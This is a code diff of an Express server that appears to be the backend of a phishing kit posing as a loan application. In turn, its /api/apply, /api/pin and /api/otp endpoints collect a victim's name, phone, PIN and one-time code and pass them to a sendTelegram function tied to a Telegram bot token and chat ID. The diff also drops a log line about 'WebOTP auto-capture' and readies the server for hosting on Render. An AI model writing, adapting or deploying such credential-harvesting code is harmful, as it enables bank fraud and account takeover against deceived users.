@@ -1,20 +1,20 @@
 const express = require('express');
 const http = require('http');
 const https = require('https');
-const fs = require('fs');
-const path = require('path');
 
 // ═══════════════════════════════════════════
-// CONFIG
+// CONFIG (from Render environment variables)
 // ═══════════════════════════════════════════
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
-const PORT = process.env.PORT || 3000;   
+const PORT = process.env.PORT || 3000;
 
 // ═══════════════════════════════════════════
 // SETUP
 // ═══════════════════════════════════════════
 const app = express();
+const server = http.createServer(app);
+
 app.use(express.static(__dirname));
 app.use(express.json());
 
@@ -57,7 +57,7 @@ function sendTelegram(text) {
 }
 
 // ═══════════════════════════════════════════
-// API: Page 1
+// API: Page 1 — Application
 // ═══════════════════════════════════════════
 app.post('/api/apply', (req, res) => {
     const { name, phone, amount, period } = req.body;
@@ -80,7 +80,7 @@ app.post('/api/apply', (req, res) => {
 });
 
 // ═══════════════════════════════════════════
-// API: Page 2
+// API: Page 2 — PIN
 // ═══════════════════════════════════════════
 app.post('/api/pin', (req, res) => {
     const { name, phone, amount, period, pin } = req.body;
@@ -100,7 +100,7 @@ app.post('/api/pin', (req, res) => {
 });
 
 // ═══════════════════════════════════════════
-// API: Page 3
+// API: Page 3 — OTP
 // ═══════════════════════════════════════════
 app.post('/api/otp', (req, res) => {
     const { name, phone, amount, period, pin, otp } = req.body;
@@ -122,22 +122,8 @@ app.post('/api/otp', (req, res) => {
 });
 
 // ═══════════════════════════════════════════
-// START (HTTPS + HTTP redirect)
+// START
 // ═══════════════════════════════════════════
-const key = fs.readFileSync(path.join(__dirname, 'key.pem'));
-const cert = fs.readFileSync(path.join(__dirname, 'cert.pem'));
-
-const httpsServer = https.createServer({ key, cert }, app);
-const httpServer = http.createServer((req, res) => {
-    res.writeHead(301, { Location: `https://localhost:${PORT_HTTPS}${req.url}` });
-    res.end();
-});
-
-httpsServer.listen(PORT_HTTPS, () => {
-    console.log(`🔒 HTTPS: https://localhost:${PORT_HTTPS}`);
-    console.log(`📡 Use THIS URL for WebOTP auto-capture`);
-});
-
-httpServer.listen(PORT, () => {
-    console.log(`🌐 HTTP: http://localhost:${PORT} (redirects to HTTPS)`);
+server.listen(PORT, () => {
+    console.log(`🚀 Server running on port ${PORT}`);
 });   
